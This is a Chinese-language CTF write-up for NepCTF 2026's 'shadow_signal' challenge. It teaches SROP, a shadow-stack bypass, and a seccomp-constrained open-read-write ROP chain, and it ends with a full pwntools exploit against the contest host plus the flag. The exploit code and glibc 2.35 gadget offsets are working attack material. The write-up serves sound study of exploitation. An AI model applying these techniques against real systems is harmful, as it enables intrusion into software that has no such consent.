# Shadow Signal 详细题解 — SROP 从入门到实战

## 一、题目信息

- **题目名称**: shadow_signal
- **比赛**: NepCTF 2026
- **考点**: SROP、Seccomp 沙箱、影子栈绕过、ROP 链构造
- **环境**: glibc 2.35, x86-64, 动态链接

## 二、什么是 SROP（5 分钟速成）

### 2.1 正常的信号处理流程

当进程收到信号（如 SIGSEGV）时，Linux 内核会做这些事情：

```
1. 内核暂停进程当前执行
2. 内核把当前所有寄存器的值保存到栈上（这个结构体叫 ucontext）
3. 内核在栈上放一个"返回地址"（指向 __restore_rt 函数）
4. 内核跳转到信号处理函数（handler）
5. handler 执行完，执行 ret 指令
6. ret 跳转到 __restore_rt
7. __restore_rt 执行 mov rax, 15; syscall （这就是 rt_sigreturn 系统调用）
8. 内核从栈上的 ucontext 恢复所有寄存器
9. 进程从被中断的地方继续执行（就像什么都没发生）
```

栈上的布局大概是这样的：

```
高地址
┌─────────────────────────┐
│  ucontext.uc_sigmask    │  ← 信号掩码
├─────────────────────────┤
│  ucontext.uc_mcontext   │  ← 保存的寄存器（RIP、RSP、RAX、RDI...）
│  (sigcontext, 256字节)  │
├─────────────────────────┤
│  ucontext.uc_stack      │  ← 备用栈信息（24字节）
├─────────────────────────┤
│  ucontext.uc_link       │  ← 8字节
├─────────────────────────┤
│  ucontext.uc_flags      │  ← 8字节
├─────────────────────────┤
│  返回地址 (pretcode)     │  ← 指向 __restore_rt 的指针
├─────────────────────────┤
│  保存的 rbp              │  ← handler 执行 push rbp 时保存的
├─────────────────────────┤  ← rbp 指向这里
│  handler 的局部变量      │
│  ...                    │
│  read() 的 buffer       │  ← rbp - 0x110
└─────────────────────────┘
低地址
```

### 2.2 SROP 的核心思想

**关键洞察**: 第 8 步 `rt_sigreturn` 会从栈上的 `ucontext` 恢复**所有**寄存器。如果我们能**覆写 ucontext 区域**，就可以在 sigreturn 之后拥有**任意寄存器的完全控制权**。

这就是 SROP — **Sigreturn-Oriented Programming**。

一次成功的 SROP 可以同时控制：
- RIP（程序计数器，决定执行什么代码）
- RSP（栈指针，决定 ROP 链在哪）
- RAX, RDI, RSI, RDX...（所有通用寄存器）
- EFLAGS, CS（标志和段寄存器）

这比传统 ROP 强大得多：ROP 需要一个一个 gadget 地设置寄存器，而 SROP 一步到位。

## 三、逆向分析 shadow_signal

### 3.1 用到的工具

```bash
# 查看二进制保护
checksec shadow_signal

# 反汇编
objdump -d -M intel shadow_signal

# 查看 libc 版本
strings libc.so.6 | grep "GNU C"
```

### 3.2 程序流程

程序有以下几个关键函数：

#### main() — 入口点

```c
int main() {
    char buf[8];
    init();                         // 初始化（见下文）
    printf("gift: %p\n", stdout);   // ← 泄露 libc 地址！
    read(0, buf, 8);                // 读入 8 字节
    puts(buf);                      // 把 buf 当作指针传给 puts
    return 0;
}
```

**关键点**: `puts(buf)` 中，`buf` 的内容被当作一个**指针**传给 `puts`。如果我们写 8 个字节的地址，`puts` 会尝试打印那个地址的内容。

#### init() — 初始化

```c
void init() {
    setvbuf(stdin, NULL, _IONBF, 0);    // 禁用 stdin 缓冲
    setvbuf(stdout, NULL, _IONBF, 0);   // 禁用 stdout 缓冲
    setvbuf(stderr, NULL, _IONBF, 0);   // 禁用 stderr 缓冲
    
    // 注册 SIGSEGV 处理器，标志 SA_RESETHAND（用完一次就恢复默认）
    sigaction(SIGSEGV, &handler_action, NULL);
    
    protect_bss();       // mprotect BSS 段为读+写
    install_seccomp();   // 安装 seccomp 沙箱
}
```

#### install_seccomp() — 沙箱规则

```
允许的系统调用:
  read(0), write(1), open(2)
  mmap(9), mprotect(10)
  sigaction(13), sigreturn(15)
  prctl(157), exit(60), exit_group(231)

禁止: execve, fork, ... (不能弹 shell！)
```

**结论**: 必须走 **ORW（Open-Read-Write）** 路线读 flag。

#### handler() — 信号处理函数（核心漏洞点）

```c
void handler(int signum) {
    // 1. 保存"影子栈"——记录返回地址
    shadow_saved_rip = *(uint64_t *)(rbp + 8);
    
    // 2. 输出提示
    write(1, "signal\n", 7);
    
    // 3. 栈溢出！！！读取 0x500 字节到栈上 0x110 字节的缓冲区
    read(0, rbp - 0x110, 0x500);  // ← 缓冲区溢出
    
    // 4. 影子栈检查
    if (*(uint64_t *)(rbp + 8) != shadow_saved_rip) {
        write(1, "shadow stack broken\n", 20);
        exit(1);
    }
    
    // 5. 正常返回 → 执行 __restore_rt → sigreturn
}
```

**这里有两个重要机制**:

1. **栈溢出**: `read(0, rbp-0x110, 0x500)`。buffer 只有 `0x110` 字节，但可以读 `0x500` 字节。多出的 `0x3F0` 字节会覆写栈上的其他数据。

2. **影子栈保护**: 在函数入口保存了 `[rbp+8]`（返回地址）到全局变量 `shadow_saved_rip`。返回前检查是否被修改。如果修改了就退出。

### 3.3 栈布局分析

```
buffer 起始地址: rbp - 0x110

偏移量    内容
─────────────────────────────────────────
0x000     buffer 开始（读入的数据写到这里）
...       
0x110     保存的 rbp（handler 执行 push rbp 时保存的）
0x118     返回地址 ← 影子栈检查这里！
0x120     ucontext.uc_flags
0x128     ucontext.uc_link
0x130     ucontext.uc_stack（24 字节）
0x148     ucontext.uc_mcontext 开始（sigcontext, 256 字节）
          ├─ 0x148: r8~r15 （8×8=64字节）
          ├─ 0x188: rdi    ← 控制！
          ├─ 0x190: rsi    ← 控制！
          ├─ 0x198: rbp
          ├─ 0x1a0: rbx
          ├─ 0x1a8: rdx    ← 控制！
          ├─ 0x1b0: rax    ← 控制！
          ├─ 0x1b8: rcx
          ├─ 0x1c0: rsp    ← 控制！新的栈指针
          ├─ 0x1c8: rip    ← 控制！新的程序计数器
          ├─ 0x1d0: eflags
          ├─ 0x1d8: cs+gs+fs（各2字节）
          ├─ 0x1e0: err
          ├─ 0x1e8: trapno
          ├─ 0x1f0: oldmask
          ├─ 0x1f8: cr2
          ├─ 0x200: fpstate 指针（设为 NULL）
          └─ 0x208: reserved
0x248     ucontext.uc_sigmask（8 字节）
```

**关键洞察**:
- 影子栈只检查 `0x118` 处的返回地址
- 但 `0x120` 以上的整个 ucontext 都不被检查！
- 如果我们保持 `0x118` 不变，但修改 ucontext 中的 RIP、RSP、RAX 等寄存器
- 当 sigreturn 执行时，内核就会恢复我们设置的寄存器
- 然后程序就跳转到我们控制的 RIP，使用我们控制的 RSP！

这就是**影子栈绕过的核心原理**。

## 四、编写 Exploit

### 4.1 泄露 libc 基址

```
程序输出: "gift: 0x7f5d2f346780"
                   └─ stdout 在 libc 中的地址
```

```python
STDOUT_OFFSET = 0x21b780  # _IO_2_1_stdout_ 在 libc 中的偏移

io.recvuntil(b"gift: ")
leak = int(io.recvuntil(b"\n", drop=True), 16)
libc_base = leak - STDOUT_OFFSET  # 计算 libc 加载基址
```

### 4.2 触发 SIGSEGV

`puts` 把我们输入的 8 字节当作指针。如果我们发一个非法地址（如 `0x4141414141414141`）：

```python
io.send(p64(0x4141414141414141))  # puts 尝试读这个地址 → SIGSEGV!
```

程序收到 SIGSEGV → 进入 handler → 输出 "signal\n" → 停在 read() 等待输入。

### 4.3 构造 SROP 载荷（最重要的一步）

我们的目标是让 sigreturn 之后执行：

```c
read(0, BSS_ADDR, 0x500);  // 从 stdin 读 ROP 链到 BSS
```

需要使用 pwntools 的 `SigreturnFrame`：

```python
from pwn import *

frame = SigreturnFrame(kernel="amd64")  # 创建 SROP 帧
frame.rax = 0          # 系统调用号 = 0 = SYS_read
frame.rdi = 0          # fd = 0 = stdin
frame.rsi = 0x404800   # buf = BSS 地址（ROP 链目标）
frame.rdx = 0x500      # size = 0x500
frame.rsp = 0x404800   # 新的栈指针 = BSS 地址
frame.rip = libc + 0x91316  # RIP = syscall; ret 指令的地址
frame.eflags = 0x202   # 标志寄存器（bit1=1必须，bit9=IF）
frame.csgsfs = 0x33    # cs=0x33（用户态代码段），gs=fs=0
frame['uc_stack.ss_flags'] = 2  # SS_DISABLE（避免内核校验失败）
```

然后构造完整载荷：

```python
payload  = b"\x00" * 0x110       # 填充到 saved rbp
payload += p64(0)                 # fake saved rbp（无所谓）
payload += p64(__restore_rt)      # ← 返回地址！必须等于原始值！
payload += bytes(frame)           # ← SROP 帧（覆写 ucontext）
payload += b"\x00" * (0x500 - len(payload))  # 填充到 0x500
```

**关键点解释**:

1. **`p64(__restore_rt)` 放在 `0x118`**: 
   - 影子栈检查比对 `[rbp+8]` 和 `shadow_saved_rip`
   - `shadow_saved_rip` 在 handler 入口保存的是原始的返回地址
   - 原始的返回地址就是 glibc 的 `__restore_rt` 函数地址
   - 所以我们必须写**同样的值回去**，检查才能通过

2. **`__restore_rt` = `libc + 0x42520`**:
   - 这是 glibc 中的 `__restore_rt` 函数
   - 内容就是：`mov rax, 15; syscall`（触发 rt_sigreturn）
   - 在 libc 中找到它的方法：
     ```python
     libc.search(asm('mov rax, 0xf; syscall'))
     # 结果: 0x42520
     ```

3. **填充到 `0x500` 字节**: 
   - handler 的 `read()` 用 `0x500` 大小的 buffer
   - SROP 执行后的 `read()` 也读 stdin
   - 如果两次 `read()` 的数据混在一起（TCP 合并发送），ROP 链会被破坏
   - 填充到 `0x500` 确保 handler 读走全部载荷，ROP 链数据被第二个 read 正确接收

4. **`ss_flags = 2` (SS_DISABLE)**:
   - 内核在 sigreturn 时会调用 `restore_altstack()` 验证 uc_stack
   - 如果 `ss_flags = 0`（表示备用栈启用但没有提供有效地址），内核校验失败
   - 设为 `SS_DISABLE = 2` 告诉内核"没有使用备用信号栈"，校验通过

### 4.4 构造 ORW ROP 链

SROP 完成后，`read(0, BSS, 0x500)` 在等待输入。我们发送的 ROP 链会被写入 BSS。

然后 `syscall; ret` 中的 `ret` 指令从 `[RSP]` = `[BSS_ADDR]` 弹出第一个 gadget 地址，ROP 链开始执行。

```python
# 找 gadget（在 libc 的可执行段!）
# syscall; ret     → 0x91316
# pop rdi; ret     → 0x2a3e5
# pop rsi; ret     → 0x2be51
# pop rdx; pop rbx; ret → 0x904a9  ← 注意！必须用这个！
# pop rax; ret     → 0x45eb0
# xchg eax, edi; ret   → 0x164f9e  # 交换 eax 和 edi（传递 fd）

FLAG_STR = BSS + 0x100  # "/flag\0" 字符串存放位置
FLAG_BUF = BSS + 0x200  # flag 内容缓冲区

rop  = b""

# === 第 1 步: open("/flag", O_RDONLY) ===
rop += p64(pop_rdi) + p64(FLAG_STR)  # rdi = 指向 "/flag" 的指针
rop += p64(pop_rsi) + p64(0)         # rsi = 0 (O_RDONLY)
rop += p64(pop_rax) + p64(2)         # rax = 2 (SYS_open)
rop += p64(syscall_ret)              # syscall → rax = fd（文件描述符）

# === 第 2 步: read(fd, FLAG_BUF, 0x100) ===
rop += p64(xchg_eax_edi)             # edi = eax (把 fd 传给 rdi)
rop += p64(pop_rsi) + p64(FLAG_BUF)  # rsi = flag 缓冲区
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)  # rdx=0x100, rbx=填充
rop += p64(pop_rax) + p64(0)         # rax = 0 (SYS_read)
rop += p64(syscall_ret)              # syscall → read(fd, buf, 0x100)

# === 第 3 步: write(1, FLAG_BUF, 0x100) ===
rop += p64(pop_rdi) + p64(1)         # rdi = 1 (stdout)
rop += p64(pop_rsi) + p64(FLAG_BUF)  # rsi = flag 缓冲区
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)  # rdx=0x100, rbx=填充
rop += p64(pop_rax) + p64(1)         # rax = 1 (SYS_write)
rop += p64(syscall_ret)              # syscall → write(1, buf, 0x100)

# 填充 ROP 链到 FLAG_STR，然后放入 "/flag\0"
rop += b"\x00" * (FLAG_STR - BSS - len(rop))
rop += b"/flag\x00"
```

### 4.5 整体攻击链回顾

```
1. 接收 libc 泄露
2. 发送非法地址 → 触发 SIGSEGV → 进入 handler
3. 接收 "signal\n"
4. 发送 SROP 载荷（精确 0x500 字节）
   ├─ 0x110 字节填充
   ├─ fake rbp
   ├─ __restore_rt（保持影子栈检查通过）
   ├─ SROP 帧（设置所有寄存器）
   └─ 填充到 0x500 字节

5. handler 返回 → __restore_rt → sigreturn
   → 内核恢复我们的寄存器
   → RIP = syscall;ret, RAX=0, RDI=0, RSI=BSS, RDX=0x500, RSP=BSS
   → 执行 read(0, BSS, 0x500)

6. 发送 ORW ROP 链
   → SROP 的 read 把 ROP 链写入 BSS
   → syscall;ret 中的 ret 从 [BSS] 弹出第一个 gadget
   → ROP 链开始执行

7. open("/flag") → read(fd, buf) → write(1, buf)
   → flag 输出到 stdout
```

## 五、踩过的坑（最重要！）

### 坑 1: `pop rdx; ret` 在不可执行段

```python
# ❌ 错误：这个地址在 libc 的只读段（不可执行）！
POP_RDX_RET = 0x47ce  # 在段 0x0-0x27fe0 (R--)

# ✓ 正确：使用可执行段中的 gadget
# pop rdx; pop rbx; ret
POP_RDX_RBX_RET = 0x904a9  # 在段 0x28000-0x1bc401 (R-E)
```

**教训**: `libc.search()` 只在文件中搜索字节序列，**不检查该地址是否可执行**。libc 的 ELF 文件在地址 0x28000 之前是只读数据段（符号表、字符串等），虽然碰巧包含 `5a c3`（pop rdx; ret），但这段内存**没有执行权限**。跳转过去直接 SIGSEGV。

**如何验证**:
```bash
python3 -c "
from pwn import *
libc = ELF('./libc.so.6')
for seg in libc.segments:
    if seg.header.p_type == 'PT_LOAD':
        flags = seg.header.p_flags
        print(f'{seg.header.p_vaddr:#x} E={bool(flags&1)}')
"
# 输出:
# 0x0      E=False  ← 0x47ce 在这里！不可执行！
# 0x28000  E=True   ← 可执行段开始，0x904a9 在这里
# 0x1bd000 E=False
# 0x2168f0 E=False
```

### 坑 2: `uc_stack.ss_flags` 必须设 `SS_DISABLE`

```python
frame['uc_stack.ss_flags'] = 2  # SS_DISABLE
```

**原因**: Linux 5.9+ 的内核在 sigreturn 时会调用 `restore_altstack()` 校验 uc_stack。如果 `ss_flags = 0`（默认），内核认为备用栈是**启用**的，但 `ss_sp = 0` 是无效地址 → 校验失败 → SIGSEGV → core dump。

设为 `SS_DISABLE = 2` 告诉内核"我没用备用信号栈"，校验通过。

### 坑 3: SROP 载荷必须填充到 0x500 字节

handler 的 `read(0, rbp-0x110, 0x500)` 和 SROP 的 `read(0, BSS, 0x500)` 都读 stdin。如果两个 `send()` 的数据被 TCP 合并到同一个 TCP 段：

```
TCP 段: [SROP 载荷 536 字节] [ROP 链 280 字节]
         └─ handler read 读走前 0x500 字节
                              └─ SROP read 读走后 316 字节
```

但 SROP read 读到的 316 字节中，**前 36 字节是 SROP 载荷的尾部**（不是 ROP 链！）。这 36 字节被当作 ROP 链的前几个 gadget，导致崩溃。

**修复**: 把 SROP 载荷填充到**刚好 0x500 字节**。这样 handler read 读走完整的 0x500 字节，SROP read 读到的**全部**是 ROP 链数据。

### 坑 4: 影子栈检查需要精确的 `__restore_rt` 地址

```python
# 搜索 __restore_rt
for addr in libc.search(asm('mov rax, 0xf; syscall')):
    print(hex(addr))  # → 0x42520

RESTORE_RT_OFFSET = 0x42520
```

## 六、调试技巧

当 SROP 出问题时，按以下顺序排查：

```python
# 1. 测试影子栈检查：故意发错误的返回地址
payload = b"\x00" * 0x110 + p64(0) + p64(0xDEADBEEF)
# → 应收到 "shadow stack broken\n"

# 2. 测试 sigreturn：设置 RIP = _exit@plt
frame.rip = 0x4010d0  # _exit
# → 应退出无 core dump

# 3. 测试 SROP + read + 小 ROP：只调 exit(0)
rop = p64(prdi) + p64(0) + p64(prax) + p64(60) + p64(sret)
# → 应退出无 core dump

# 4. 逐个添加 gadget，找出哪个有问题
rop = p64(prdi) + p64(0) + p64(prsi) + p64(0) + p64(prax) + p64(60) + p64(sret)
# → 如果崩溃，说明 prsi 地址有问题
```

## 七、完整 Exploit 代码

```python
"""
shadow_signal - SROP exploit
NepCTF 2026
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

# libc offsets (glibc 2.35)
STDOUT_OFFSET     = 0x21b780
RESTORE_RT_OFFSET = 0x42520
SYSCALL_RET       = 0x91316
POP_RDI_RET       = 0x2a3e5
POP_RSI_RET       = 0x2be51
POP_RDX_RBX_RET   = 0x904a9   # pop rdx; pop rbx; ret
POP_RAX_RET       = 0x45eb0
XCHG_EAX_EDI_RET  = 0x164f9e  # xchg eax, edi; ret

BSS_ADDR      = 0x404800
FLAG_STR_ADDR = BSS_ADDR + 0x100
FLAG_BUF_ADDR = BSS_ADDR + 0x200

io = remote("ytdc6n56-8ihr-eamk-ebhu-6a5a1fb031393-neptune.nepctf.com",
            443, ssl=True)

# ---- Step 1: libc leak ----
io.recvuntil(b"gift: ")
leak = int(io.recvuntil(b"\n", drop=True), 16)
libc = leak - STDOUT_OFFSET

rrt   = libc + RESTORE_RT_OFFSET
sret  = libc + SYSCALL_RET
prdi  = libc + POP_RDI_RET
prsi  = libc + POP_RSI_RET
prdxb = libc + POP_RDX_RBX_RET
prax  = libc + POP_RAX_RET
xchg  = libc + XCHG_EAX_EDI_RET

# ---- Step 2: trigger SIGSEGV ----
io.send(p64(0x4141414141414141))
io.recvuntil(b"signal\n")

# ---- Step 3: SROP payload ----
frame = SigreturnFrame(kernel="amd64")
frame.rax = 0; frame.rdi = 0
frame.rsi = BSS_ADDR; frame.rdx = 0x500
frame.rsp = BSS_ADDR; frame.rip = sret
frame.eflags = 0x202; frame.csgsfs = 0x33
frame['uc_stack.ss_flags'] = 2  # SS_DISABLE

payload  = b"\x00" * 0x110 + p64(0) + p64(rrt) + bytes(frame)
payload += b"\x00" * (0x500 - len(payload))
io.send(payload)
sleep(1)

# ---- Step 4: ORW ROP chain ----
rop  = b""
rop += p64(prdi) + p64(FLAG_STR_ADDR)
rop += p64(prsi) + p64(0)
rop += p64(prax) + p64(2)
rop += p64(sret)
rop += p64(xchg)
rop += p64(prsi) + p64(FLAG_BUF_ADDR)
rop += p64(prdxb) + p64(0x100) + p64(0)
rop += p64(prax) + p64(0)
rop += p64(sret)
rop += p64(prdi) + p64(1)
rop += p64(prsi) + p64(FLAG_BUF_ADDR)
rop += p64(prdxb) + p64(0x100) + p64(0)
rop += p64(prax) + p64(1)
rop += p64(sret)
rop += b"\x00" * (FLAG_STR_ADDR - BSS_ADDR - len(rop))
rop += b"/flag\x00"
io.send(rop)

# ---- Get flag ----
sleep(0.5)
data = io.recvall(timeout=5)
print(data.split(b'\n')[0].decode())
```

## 八、总结

SROP 利用的三要素：

1. **找到可溢出的栈缓冲区**，并且溢出范围能覆盖到 sigreturn 的 ucontext
2. **保持返回地址不变**（如果有影子栈保护），但在 ucontext 中修改寄存器
3. **设置正确的 CS、EFLAGS、ss_flags** 通过内核的 sigreturn 校验

配合 Seccomp 沙箱时，最终必须走 ORW 路线读取 flag 文件，不能弹 shell。

Flag: `NepCTF{eaaad9d7-3a9a-d615-2be3-b4603418792b}`
